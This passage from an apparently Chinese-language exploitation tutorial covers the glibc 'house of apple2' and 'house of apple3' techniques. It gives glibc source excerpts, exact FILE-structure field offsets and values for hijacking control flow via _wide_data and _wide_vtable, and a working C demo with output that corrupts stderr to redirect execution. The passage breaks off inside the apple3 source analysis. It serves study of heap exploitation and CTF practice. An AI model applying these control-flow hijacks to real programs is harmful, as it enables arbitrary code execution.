class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base == NULL</code>和<code>fp-&gt;_wide_data-&gt;_IO_save_base == NULL</code>。</p>
<h3 id="利用-IO-wdefault-xsgetn函数控制程序执行流"><a href="#利用-IO-wdefault-xsgetn函数控制程序执行流" class="headerlink" title="利用_IO_wdefault_xsgetn函数控制程序执行流"></a>利用_IO_wdefault_xsgetn函数控制程序执行流</h3><p><strong>这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为0</strong>。如果不满足这个条件，可选用其他链。</p>
<p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>0x800</code></li>
<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li>
<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<p>函数的调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure>
<p>详细分析如下：<br>首先看<code>_IO_wdefault_xsgetn</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_wdefault_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">wchar_t</span> *s = (<span class="type">wchar_t</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="type">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">size_t</span>) count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">          <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">          <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">        *s++ = *p++;</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">            &#125;</span><br><span class="line">            more -= count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdefault_xsgetn)</span><br></pre></td></tr></table></figure>
<p>由于<code>more</code>是第三个参数，所以不能为<code>0</code>。<br>直接设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end</code>，使得<code>count</code>为<code>0</code>，不进入<code>if</code>分支。<br>随后当<code>more != 0</code>时会进入<code>__wunderflow</code>。</p>
<p>接着看<code>__wunderflow</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">__wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要想调用到<code>_IO_switch_to_wget_mode</code>，需要设置<code>fp-&gt;mode &gt; 0</code>，并且<code>fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0</code>。</p>
<p>然后在<code>_IO_switch_to_wget_mode</code>函数中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base时就会调用_IO_WOVERFLOW(fp)。</p>
<h2 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h2><p>以下面提到的<code>_IO_wdefault_xsgetn</code>函数利用为例，编写<code>demo</code>示例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m[!] Backdoor is called!\n&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *)puts_addr);</span><br><span class="line">    <span class="type">size_t</span> libc_base_addr = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc base address: %p\n&quot;</span>, (<span class="type">void</span> *)libc_base_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_2_1_stderr_addr = libc_base_addr + <span class="number">0x1ed5c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = libc_base_addr + <span class="number">0x1e8c60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *stderr2 = (<span class="type">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_flags to 0x800&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr2 = <span class="number">0x800</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_mode to 1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xc0</span>) = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps-0x20&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wstrn_jumps_addr<span class="number">-0x20</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xa0</span>) = (<span class="type">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0xe0</span>) = (<span class="type">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0x20</span>) = (<span class="type">size_t</span>)<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p2 + <span class="number">0x18</span>) = (<span class="type">size_t</span>)(&amp;backdoor);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 8: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[*] allocate two <span class="number">0x200</span> chunks</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7f8f73d2e420</span></span><br><span class="line">[*] libc base address: <span class="number">0x7f8f73caa000</span></span><br><span class="line">[*] _IO_2_1_stderr_ address: <span class="number">0x7f8f73e975c0</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7f8f73e92c60</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_flags to <span class="number">0x800</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_mode to <span class="number">1</span></span><br><span class="line">[+] step <span class="number">3</span>: change <span class="built_in">stderr</span>-&gt;vtable to _IO_wstrn_jumps<span class="number">-0x20</span></span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step <span class="number">5</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step <span class="number">6</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base</span><br><span class="line">[+] step <span class="number">7</span>: put backdoor at fake _wide_vtable-&gt;_overflow</span><br><span class="line">[+] step <span class="number">8</span>: call <span class="title function_">fflush</span><span class="params">(<span class="built_in">stderr</span>)</span> to trigger backdoor func</span><br><span class="line">[!] Backdoor is called!</span><br></pre></td></tr></table></figure>
<h1 id="house-of-apple3"><a href="#house-of-apple3" class="headerlink" title="house of apple3"></a>house of apple3</h1><h2 id="概要-16"><a href="#概要-16" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong><code>house of apple1</code>中的利用链能<strong>任意地址写堆地址</strong>，<code>house of apple2</code>中的利用链能通过控制<code>FILE</code>结构体的<code>_wide_data</code>成员去<strong>直接控制程序执行流。</strong><code>house of apple3</code>则关注<code>FILE</code>结构体的另外一个成员<code>_codecvt</code>的利用。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li>
<li>能够泄露堆地址和libc基址</li>
<li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_codecvt</code>，一般使用<code>largebin attack</code>去控制</li>
</ol>
<p><strong>利用效果:</strong>控制流</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-16"><a href="#原理-16" class="headerlink" title="原理"></a>原理</h2><p><code>FILE</code>结构体中有一个成员<code>struct _IO_codecvt *_codecvt;</code>，偏移为<code>0x98</code>。该结构体参与宽字符的转换工作，结构体被定义为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio\libio.h:115</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// libio\libio.h:51</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">step</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span> <span class="title">step_data</span>;</span></span><br><span class="line">&#125; _IO_iconv_t;</span><br></pre></td></tr></table></figure>
<p>__gconv_step:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// iconv\gconv.h:84</span></span><br><span class="line"><span class="comment">/* Description of a conversion step.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_loaded_object</span> *__<span class="title">shlib_handle</span>;</span><span class="comment">// 关注这个成员</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *__modname;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="type">int</span> __counter;</span><br><span class="line"> </span><br><span class="line">  <span class="type">char</span> *__from_name;</span><br><span class="line">  <span class="type">char</span> *__to_name;</span><br><span class="line"> </span><br><span class="line">  __gconv_fct __fct;<span class="comment">// 关注这个成员</span></span><br><span class="line">  __gconv_btowc_fct __btowc_fct;</span><br><span class="line">  __gconv_init_fct __init_fct;</span><br><span class="line">  __gconv_end_fct __end_fct;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Information about the number of bytes needed or produced in this</span></span><br><span class="line"><span class="comment">     step.  This helps optimizing the buffer sizes.  */</span></span><br><span class="line">  <span class="type">int</span> __min_needed_from;</span><br><span class="line">  <span class="type">int</span> __max_needed_from;</span><br><span class="line">  <span class="type">int</span> __min_needed_to;</span><br><span class="line">  <span class="type">int</span> __max_needed_to;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flag whether this is a stateful encoding or not.  */</span></span><br><span class="line">  <span class="type">int</span> __stateful;</span><br><span class="line"> </span><br><span class="line">  <span class="type">void</span> *__data;        <span class="comment">/* Pointer to step-local data.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>__gconv_step_data:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Additional data for steps in use of conversion descriptor.  This is</span></span><br><span class="line"><span class="comment">   allocated by the `init&#x27; function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbuf;    <span class="comment">/* Output buffer for this step.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbufend; <span class="comment">/* Address of first byte after the output</span></span><br><span class="line"><span class="comment">                 buffer.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Is this the last module in the chain.  */</span></span><br><span class="line">  <span class="type">int</span> __flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Counter for number of invocations of the module function for this</span></span><br><span class="line"><span class="comment">     descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> __invocation_counter;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flag whether this is an internal use of the module (in the mb*towc*</span></span><br><span class="line"><span class="comment">     and wc*tomb* functions) or regular with iconv(3).  */</span></span><br><span class="line">  <span class="type">int</span> __internal_use;</span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> *__statep;</span><br><span class="line">  <span class="type">__mbstate_t</span> __state;    <span class="comment">/* This element must not be used directly by</span></span><br><span class="line"><span class="comment">               any module; always use STATEP!  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>以上两个结构体均会被用于字符转换，而在利用的过程中，需要精准控制结构体中的某些成员，避免引发内存访问错误。</p>
<p><code>house of apple3</code>的利用主要关注以下三个函数：<code>__libio_codecvt_out</code>、<code>__libio_codecvt_in</code>和<code>__libio_codecvt_length</code>。</p>
<p>三个函数定义在glibc\libio\iofwide.c</p>
<p>三个函数的利用点都差不多，以<code>__libio_codecvt_in</code>为例，源码分析如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">            <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">            <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">            <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span 